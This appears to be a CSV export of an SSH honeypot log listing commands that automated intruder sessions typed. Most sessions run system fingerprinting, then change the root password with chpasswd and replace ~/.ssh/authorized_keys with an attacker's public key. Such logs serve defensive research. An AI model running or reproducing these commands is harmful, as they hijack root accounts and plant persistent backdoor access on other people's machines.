id,session,timestamp,realm,input
47847,0b7bfdbae2e5,2022-11-19T21:22:42.162828Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
47848,7ae2b9565440,2022-11-19T21:22:42.236707Z,,"uname -m"
47849,0b7bfdbae2e5,2022-11-19T21:22:42.724632Z,,"which ls"
47850,0b7bfdbae2e5,2022-11-19T21:22:42.723655Z,,"ls -lh $(which ls)"
47851,7ae2b9565440,2022-11-19T21:22:43.131947Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
47852,0b7bfdbae2e5,2022-11-19T21:22:43.235535Z,,"crontab -l"
47853,0b7bfdbae2e5,2022-11-19T21:22:43.832884Z,,w
47854,7ae2b9565440,2022-11-19T21:22:43.981916Z,,top
47855,0b7bfdbae2e5,2022-11-19T21:22:44.342985Z,,"uname -m"
47856,7ae2b9565440,2022-11-19T21:22:44.831823Z,,uname
47857,0b7bfdbae2e5,2022-11-19T21:22:44.893907Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
47858,0b7bfdbae2e5,2022-11-19T21:22:45.490524Z,,top
47859,7ae2b9565440,2022-11-19T21:22:45.675928Z,,"uname -a"
47860,0b7bfdbae2e5,2022-11-19T21:22:46.026326Z,,uname
47861,7ae2b9565440,2022-11-19T21:22:46.527813Z,,"lscpu | grep Model"
47862,0b7bfdbae2e5,2022-11-19T21:22:46.576406Z,,"uname -a"
47863,0b7bfdbae2e5,2022-11-19T21:22:47.184629Z,,"lscpu | grep Model"
47864,7ae2b9565440,2022-11-19T21:22:47.383739Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
47865,0b7bfdbae2e5,2022-11-19T21:22:47.737196Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
47866,c6b2ab63c110,2022-11-19T21:23:00.960987Z,,"cat /proc/cpuinfo | grep name | wc -l"
47867,c6b2ab63c110,2022-11-19T21:23:01.769922Z,,"echo ""root:goij1xJd7uXM""|chpasswd|bash"
47868,c6b2ab63c110,2022-11-19T21:23:02.639241Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
47869,c6b2ab63c110,2022-11-19T21:23:03.469083Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
47870,c6b2ab63c110,2022-11-19T21:23:04.266175Z,,"which ls"
47871,c6b2ab63c110,2022-11-19T21:23:04.265337Z,,"ls -lh $(which ls)"
47872,c6b2ab63c110,2022-11-19T21:23:05.142919Z,,"crontab -l"
47873,c6b2ab63c110,2022-11-19T21:23:05.970111Z,,w
47874,c6b2ab63c110,2022-11-19T21:23:06.755769Z,,"uname -m"
47875,c6b2ab63c110,2022-11-19T21:23:07.627561Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
47876,c6b2ab63c110,2022-11-19T21:23:08.420839Z,,top
47877,c6b2ab63c110,2022-11-19T21:23:09.280777Z,,uname
47878,c6b2ab63c110,2022-11-19T21:23:10.117093Z,,"uname -a"
47879,c6b2ab63c110,2022-11-19T21:23:10.908531Z,,"lscpu | grep Model"
47880,c6b2ab63c110,2022-11-19T21:23:11.775418Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
47881,70c662eaa50a,2022-11-19T21:23:47.869608Z,,"cat /proc/cpuinfo | grep name | wc -l"
47882,70c662eaa50a,2022-11-19T21:23:48.750442Z,,"echo ""root:usJC3iay8XMM""|chpasswd|bash"
47883,70c662eaa50a,2022-11-19T21:23:49.584227Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
47884,70c662eaa50a,2022-11-19T21:23:50.376455Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
47885,70c662eaa50a,2022-11-19T21:23:51.254390Z,,"which ls"
47886,70c662eaa50a,2022-11-19T21:23:51.253739Z,,"ls -lh $(which ls)"
47887,70c662eaa50a,2022-11-19T21:23:52.055761Z,,"crontab -l"
47888,70c662eaa50a,2022-11-19T21:23:52.928865Z,,w
47889,70c662eaa50a,2022-11-19T21:23:53.759965Z,,"uname -m"
47890,70c662eaa50a,2022-11-19T21:23:54.554740Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
47891,70c662eaa50a,2022-11-19T21:23:55.428532Z,,top
47892,70c662eaa50a,2022-11-19T21:23:56.224750Z,,uname
47893,70c662eaa50a,2022-11-19T21:23:57.102795Z,,"uname -a"
47894,70c662eaa50a,2022-11-19T21:23:57.927008Z,,"lscpu | grep Model"
47895,70c662eaa50a,2022-11-19T21:23:58.719959Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
47896,9bb592be68d1,2022-11-19T21:24:39.560834Z,,"cat /proc/cpuinfo | grep name | wc -l"
47897,9bb592be68d1,2022-11-19T21:24:40.393367Z,,"echo ""root:5mpsJ1AIWc6w""|chpasswd|bash"
47898,9bb592be68d1,2022-11-19T21:24:41.181672Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
47899,9bb592be68d1,2022-11-19T21:24:42.052735Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
47900,9bb592be68d1,2022-11-19T21:24:42.845497Z,,"which ls"
47901,9bb592be68d1,2022-11-19T21:24:42.844662Z,,"ls -lh $(which ls)"
47902,9bb592be68d1,2022-11-19T21:24:43.713196Z,,"crontab -l"
47903,9bb592be68d1,2022-11-19T21:24:44.540795Z,,w
47904,9bb592be68d1,2022-11-19T21:24:45.331202Z,,"uname -m"
47905,9bb592be68d1,2022-11-19T21:24:46.201904Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
47906,9bb592be68d1,2022-11-19T21:24:46.992748Z,,top
47907,9bb592be68d1,2022-11-19T21:24:47.865499Z,,uname
47908,9bb592be68d1,2022-11-19T21:24:48.694037Z,,"uname -a"
47909,9bb592be68d1,2022-11-19T21:24:49.487253Z,,"lscpu | grep Model"
47910,d095b294440e,2022-11-19T21:24:49.921667Z,,"cat /proc/cpuinfo | grep name | wc -l"
47911,9bb592be68d1,2022-11-19T21:24:50.370572Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
47912,d095b294440e,2022-11-19T21:24:50.398104Z,,"echo ""root:dTYjqiHNs1FU""|chpasswd|bash"
47913,d095b294440e,2022-11-19T21:24:50.897022Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
47914,d095b294440e,2022-11-19T21:24:51.344921Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
47915,d095b294440e,2022-11-19T21:24:51.868582Z,,"which ls"
47916,d095b294440e,2022-11-19T21:24:51.867843Z,,"ls -lh $(which ls)"
47917,d095b294440e,2022-11-19T21:24:52.352829Z,,"crontab -l"
47918,d095b294440e,2022-11-19T21:24:52.802658Z,,w
47919,d095b294440e,2022-11-19T21:24:53.326604Z,,"uname -m"
47920,d095b294440e,2022-11-19T21:24:53.776705Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
47921,d095b294440e,2022-11-19T21:24:54.302603Z,,top
47922,d095b294440e,2022-11-19T21:24:54.790755Z,,uname
47923,d095b294440e,2022-11-19T21:24:55.252126Z,,"uname -a"
47924,d095b294440e,2022-11-19T21:24:55.772529Z,,"lscpu | grep Model"
47925,d095b294440e,2022-11-19T21:24:56.224619Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
47926,3fd81ae9af44,2022-11-19T21:25:25.076357Z,,"cat /proc/cpuinfo | grep name | wc -l"
47927,3fd81ae9af44,2022-11-19T21:25:25.629808Z,,"echo ""root:Xvprc0TMFDxN""|chpasswd|bash"
47928,3fd81ae9af44,2022-11-19T21:25:26.141749Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
47929,3fd81ae9af44,2022-11-19T21:25:26.731234Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
47930,3fd81ae9af44,2022-11-19T21:25:27.247986Z,,"which ls"
47931,3fd81ae9af44,2022-11-19T21:25:27.246911Z,,"ls -lh $(which ls)"
47932,3fd81ae9af44,2022-11-19T21:25:27.838633Z,,"crontab -l"
47933,3fd81ae9af44,2022-11-19T21:25:28.391459Z,,w
47934,3fd81ae9af44,2022-11-19T21:25:28.913112Z,,"uname -m"
47935,3fd81ae9af44,2022-11-19T21:25:29.502035Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
47936,3fd81ae9af44,2022-11-19T21:25:30.054920Z,,top
47937,3fd81ae9af44,2022-11-19T21:25:30.574004Z,,uname
47938,3fd81ae9af44,2022-11-19T21:25:31.164980Z,,"uname -a"
47939,3fd81ae9af44,2022-11-19T21:25:31.680738Z,,"lscpu | grep Model"
47940,3fd81ae9af44,2022-11-19T21:25:32.274232Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
47941,d3410f27a216,2022-11-19T21:25:51.658139Z,,"cat /proc/cpuinfo | grep name | wc -l"
47942,d3410f27a216,2022-11-19T21:25:52.106201Z,,"echo ""root:8j3EeARmX1pH""|chpasswd|bash"
47943,d3410f27a216,2022-11-19T21:25:52.627573Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
47944,d3410f27a216,2022-11-19T21:25:53.076576Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
47945,d3410f27a216,2022-11-19T21:25:53.600464Z,,"which ls"
47946,d3410f27a216,2022-11-19T21:25:53.599762Z,,"ls -lh $(which ls)"
47947,d3410f27a216,2022-11-19T21:25:54.094605Z,,"crontab -l"
47948,d3410f27a216,2022-11-19T21:25:54.546025Z,,w
47949,d3410f27a216,2022-11-19T21:25:55.069764Z,,"uname -m"
47950,d3410f27a216,2022-11-19T21:25:55.513819Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
47951,d3410f27a216,2022-11-19T21:25:56.037282Z,,top
47952,d3410f27a216,2022-11-19T21:25:56.519633Z,,uname
47953,d3410f27a216,2022-11-19T21:25:56.965034Z,,"uname -a"
47954,d3410f27a216,2022-11-19T21:25:57.505052Z,,"lscpu | grep Model"
47955,d3410f27a216,2022-11-19T21:25:57.989723Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
47956,168fa61cf857,2022-11-19T21:26:37.639322Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
47957,168fa61cf857,2022-11-19T21:26:38.724209Z,,"cat /proc/cpuinfo | grep name | wc -l"
47958,168fa61cf857,2022-11-19T21:26:39.423304Z,,"echo ""root:tW8IpPwpH9B7""|chpasswd|bash"
47959,168fa61cf857,2022-11-19T21:26:40.190798Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
47960,168fa61cf857,2022-11-19T21:26:41.133629Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
47961,168fa61cf857,2022-11-19T21:26:41.835331Z,,"which ls"
47962,168fa61cf857,2022-11-19T21:26:41.834615Z,,"ls -lh $(which ls)"
47963,168fa61cf857,2022-11-19T21:26:42.605204Z,,"crontab -l"
47964,168fa61cf857,2022-11-19T21:26:43.484879Z,,w
47965,168fa61cf857,2022-11-19T21:26:44.259492Z,,"uname -m"
47966,168fa61cf857,2022-11-19T21:26:45.355821Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
47967,168fa61cf857,2022-11-19T21:26:46.051427Z,,top
47968,168fa61cf857,2022-11-19T21:26:46.824219Z,,uname
47969,d7e838d47d54,2022-11-19T21:26:47.272766Z,,"cat /proc/cpuinfo | grep name | wc -l"
47970,168fa61cf857,2022-11-19T21:26:47.782364Z,,"uname -a"
47971,d7e838d47d54,2022-11-19T21:26:47.872112Z,,"echo ""root:ZzZcPCkh1mW2""|chpasswd|bash"
47972,d7e838d47d54,2022-11-19T21:26:48.383351Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
47973,168fa61cf857,2022-11-19T21:26:48.529752Z,,"lscpu | grep Model"
47974,d7e838d47d54,2022-11-19T21:26:48.986768Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
47975,168fa61cf857,2022-11-19T21:26:49.303327Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
47976,d7e838d47d54,2022-11-19T21:26:49.549104Z,,"which ls"
47977,d7e838d47d54,2022-11-19T21:26:49.548356Z,,"ls -lh $(which ls)"
47978,d7e838d47d54,2022-11-19T21:26:50.063292Z,,"crontab -l"
47979,168fa61cf857,2022-11-19T21:26:50.163995Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
47980,d7e838d47d54,2022-11-19T21:26:50.670225Z,,w
47981,168fa61cf857,2022-11-19T21:26:50.925310Z,,"which ls"
47982,168fa61cf857,2022-11-19T21:26:50.924607Z,,"ls -lh $(which ls)"
47983,d7e838d47d54,2022-11-19T21:26:51.231244Z,,"uname -m"
47984,d7e838d47d54,2022-11-19T21:26:51.742258Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
47985,168fa61cf857,2022-11-19T21:26:51.932576Z,,"crontab -l"
47986,d7e838d47d54,2022-11-19T21:26:52.356363Z,,top
47987,168fa61cf857,2022-11-19T21:26:52.629974Z,,w
47988,d7e838d47d54,2022-11-19T21:26:52.911555Z,,uname
47989,d7e838d47d54,2022-11-19T21:26:53.419040Z,,"uname -a"
47990,168fa61cf857,2022-11-19T21:26:53.727946Z,,"uname -m"
47991,d7e838d47d54,2022-11-19T21:26:54.021130Z,,"lscpu | grep Model"
47992,168fa61cf857,2022-11-19T21:26:54.425617Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
47993,d7e838d47d54,2022-11-19T21:26:54.579699Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
47994,168fa61cf857,2022-11-19T21:26:55.166893Z,,top
47995,168fa61cf857,2022-11-19T21:26:56.212659Z,,uname
47996,168fa61cf857,2022-11-19T21:26:57.284952Z,,"uname -a"
47997,168fa61cf857,2022-11-19T21:26:57.985643Z,,"lscpu | grep Model"
47998,e2899eaa7629,2022-11-19T21:28:12.568227Z,,"cat /proc/cpuinfo | grep name | wc -l"
47999,e2899eaa7629,2022-11-19T21:28:13.124313Z,,"echo ""root:oGbM4dn45W5w""|chpasswd|bash"
48000,e2899eaa7629,2022-11-19T21:28:13.641043Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
48001,e2899eaa7629,2022-11-19T21:28:14.238009Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
48002,e2899eaa7629,2022-11-19T21:28:14.757363Z,,"which ls"
48003,e2899eaa7629,2022-11-19T21:28:14.756535Z,,"ls -lh $(which ls)"
48004,e2899eaa7629,2022-11-19T21:28:15.346200Z,,"crontab -l"
48005,e2899eaa7629,2022-11-19T21:28:15.907104Z,,w
48006,e2899eaa7629,2022-11-19T21:28:16.422174Z,,"uname -m"
48007,e2899eaa7629,2022-11-19T21:28:17.021385Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
48008,e2899eaa7629,2022-11-19T21:28:17.542003Z,,top
48009,e2899eaa7629,2022-11-19T21:28:18.133699Z,,uname
48010,e2899eaa7629,2022-11-19T21:28:18.688909Z,,"uname -a"
48011,e2899eaa7629,2022-11-19T21:28:19.209212Z,,"lscpu | grep Model"
48012,e2899eaa7629,2022-11-19T21:28:19.811809Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
48013,864f8e0fe9e4,2022-11-19T21:32:31.858246Z,,"cat /proc/cpuinfo | grep name | wc -l"
48014,864f8e0fe9e4,2022-11-19T21:32:32.449798Z,,"echo ""root:AT1xjCcY0Gf9""|chpasswd|bash"
48015,864f8e0fe9e4,2022-11-19T21:32:32.991543Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
48016,864f8e0fe9e4,2022-11-19T21:32:33.498843Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
48017,864f8e0fe9e4,2022-11-19T21:32:34.088382Z,,"ls -lh $(which ls)"
48018,864f8e0fe9e4,2022-11-19T21:32:34.089321Z,,"which ls"
48019,864f8e0fe9e4,2022-11-19T21:32:34.631577Z,,"crontab -l"
48020,864f8e0fe9e4,2022-11-19T21:32:35.138376Z,,w
48021,864f8e0fe9e4,2022-11-19T21:32:35.721345Z,,"uname -m"
48022,864f8e0fe9e4,2022-11-19T21:32:36.237060Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
48023,864f8e0fe9e4,2022-11-19T21:32:36.828068Z,,top
48024,864f8e0fe9e4,2022-11-19T21:32:37.375561Z,,uname
48025,864f8e0fe9e4,2022-11-19T21:32:37.883115Z,,"uname -a"
48026,864f8e0fe9e4,2022-11-19T21:32:38.474151Z,,"lscpu | grep Model"
48027,864f8e0fe9e4,2022-11-19T21:32:38.983357Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
